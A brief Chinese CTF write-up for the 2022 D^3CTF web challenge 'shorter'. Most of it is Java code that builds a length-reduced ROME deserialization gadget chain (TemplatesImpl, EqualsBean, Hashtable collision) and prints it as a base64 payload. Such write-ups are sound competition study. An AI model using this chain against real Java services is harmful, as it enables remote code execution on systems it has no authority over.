# 2022-D^3CTF-Web-Writeup

## shorter

rome反序列化，但是要缩短长度。

参考https://4ra1n.love/post/-IMSkqHfy/#%E5%88%A0%E9%99%A4%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95

但是最后长了。改用Jiang宝的链子就行：

```java
        byte[] evilCode = SerializeUtil.getEvilCode();
        ClassReader cr = new ClassReader(evilCode);
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
        int api = Opcodes.ASM9;;
        ClassVisitor cv = new ShortClassVisitor(api, cw);
        int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
        cr.accept(cv, parsingOptions);
        byte[] out = cw.toByteArray();


        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{out});
        SerializeUtil.setFieldValue(templates,"_name","f");
        //SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        EqualsBean bean = new EqualsBean(String.class,"jiang");

        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",bean);
        map1.put("zZ",templates);
        map2.put("zZ",bean);
        map2.put("yy",templates);
        Hashtable table = new Hashtable();
        table.put(map1,"1");
        table.put(map2,"2");

        SerializeUtil.setFieldValue(bean,"_beanClass",Templates.class);
        SerializeUtil.setFieldValue(bean,"_obj",templates);


        byte[] bytes = SerializeUtil.serialize(table);
        System.out.println(Base64.getEncoder().encodeToString(bytes));
        //SerializeUtil.unserialize(test);
        //System.out.println(Base64.getEncoder().encodeToString(bytes));
        System.out.println(System.nanoTime());
```

